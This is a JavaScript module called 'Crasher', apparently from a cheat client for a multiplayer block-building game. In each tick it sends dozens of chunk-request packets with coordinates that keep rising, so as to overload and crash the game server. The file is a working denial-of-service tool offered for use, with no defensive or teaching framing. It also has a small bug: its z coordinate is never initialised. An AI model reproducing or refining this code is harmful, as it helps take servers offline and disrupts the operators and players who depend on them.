import packetUtils from "../../../utils/packetUtils";
import Module from "../../Module";

export default class Crasher extends Module {
    constructor() {
        super("Crasher", "World", {
            "Chunk XZ Increment": 16,
            "Packets per tick": 69
        });
        this.x = 0;
        this.y = 0;
    }

    onEnable() {
        this.x = 10;
        this.y = 10;
    }

    beforeTick () {
        let SERVER_CRASHER_CHUNK_XZ_INCREMENT = parseInt(this.options["Chunk XZ Increment"]);
        let PACKETS_PER_TICK = parseInt(this.options["Packets per tick"]);

        for (let _ = 0; _ < PACKETS_PER_TICK; _++) {
			this.x += SERVER_CRASHER_CHUNK_XZ_INCREMENT;
			this.z += SERVER_CRASHER_CHUNK_XZ_INCREMENT;
			packetUtils.sendPacket("SPacketRequestChunk", packetUtils.fields.SPacketRequestChunk, {
				x: this.x,
				z: this.z,
			});
		}
    }
}